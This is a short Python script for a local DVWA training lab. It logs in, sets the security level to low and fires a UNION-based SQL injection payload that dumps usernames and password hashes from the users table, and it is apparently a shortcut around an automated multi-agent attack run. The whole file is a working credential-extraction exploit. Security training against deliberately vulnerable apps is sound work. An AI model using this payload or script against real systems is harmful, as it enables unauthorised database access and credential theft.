"""Fast, LLM-free SQLi dump of the DVWA users table (security level low).

For the local DVWA lab only. Use this to grab credentials in seconds instead of waiting
for the full multi-agent run."""
from src.dvwa import DVWAClient

PAYLOAD = "1' UNION SELECT user, password FROM users -- -"


def main() -> None:
    client = DVWAClient()
    if not client.login():
        print("login failed — check DVWA_URL/credentials in src/config.py")
        return
    client.set_security("low")

    resp = client.run_sqli(PAYLOAD, "low")
    creds = [
        (r.get("first_name", ""), r.get("surname", ""))
        for r in resp.rows
        if len(r.get("surname", "")) >= 32  # keep rows whose surname is a password hash
    ]

    if not creds:
        print("no credentials extracted — is the DVWA database initialised (Create/Reset Database)?")
        return

    print(f"{'USERNAME':<12} HASH")
    print("-" * 46)
    for user, hash_ in creds:
        print(f"{user:<12} {hash_}")


if __name__ == "__main__":
    main()
